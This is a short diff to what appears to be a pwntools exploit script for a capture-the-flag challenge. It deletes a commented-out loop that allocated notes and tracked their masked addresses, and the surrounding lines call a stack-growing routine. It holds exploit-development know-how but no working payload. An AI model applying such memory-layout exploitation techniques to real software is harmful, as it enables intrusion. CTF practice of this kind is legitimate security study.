@@ -87,15 +87,6 @@ def main():
     #gdb.attach(io)
     io.recvuntil("I think security people will thank me for this :)")
     
-    """
-    for i in range(0x100):
-        addr = create_note(io)
-        if mask_address(addr) in mmaps.keys():
-            mmaps[mask_address(addr)] += [addr]
-        else:
-            mmaps[mask_address(addr)]  = [addr]
-    """
-    
     log.info("Start stack grow...")
     stack_grow(io)
     log.info(f"Now stack memory is large enough! - size = {hex(stack_ranges[0] - stack_ranges[1])}")
